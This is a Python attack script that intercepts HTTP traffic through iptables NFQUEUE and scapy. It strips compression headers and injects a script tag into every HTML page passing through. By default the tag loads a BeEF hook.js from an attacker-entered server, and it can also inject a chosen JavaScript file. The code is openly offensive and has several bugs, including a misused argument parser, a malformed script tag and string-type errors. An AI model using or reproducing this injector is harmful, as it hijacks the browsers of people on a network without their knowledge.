#!/usr/bin/python3
# commands to run on terminal befor running the scripts these create a queue to packet to modify
# iptables -I OUTPUT -j NFQUEUE --queue-num 0
# iptables -I INPUT -j NFQUEUE --queue-num 0
# iptables -I FORWARD -j NFQUEUE --queue-num 0

import netfilterqueue
import scapy.all as scapy
import re
import argparse


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-js", "--javasript", dest="javasript",
                        help="Choose the path to your js file. beEF is used by default")
    (options, arguments) = parser.parse_args()
    if not options.javasript:
        options.javasript = "beEF"
    return options


options = get_arguments()
if options.javasript == "beEF":
    print("Using beEF...\nInput IP of your webserver: ")
    IP = input()
    options.javasript = '"http://' + IP + ':3000/hook.js"'
    injection_code = '<script> src=' + options.javasript + '</script>'
else:
    tmp = open(options.javasript, "r")
    injection_code = '<script>' + tmp + '</script>'


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())

    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load

        if scapy_packet[scapy.TCP].dport == 80:
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)

        elif scapy_packet[scapy.TCP].sport == 80:
            load = load.replace("</body>", injection_code + "</body>")
            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)

            if content_length_search and "text/html" in load:
                content_length = content_length_search.group(1)
                new_content_length = int(content_length) + len(injection_code)
                load = load.replace(content_length, str(new_content_length))

        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(new_packet))

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
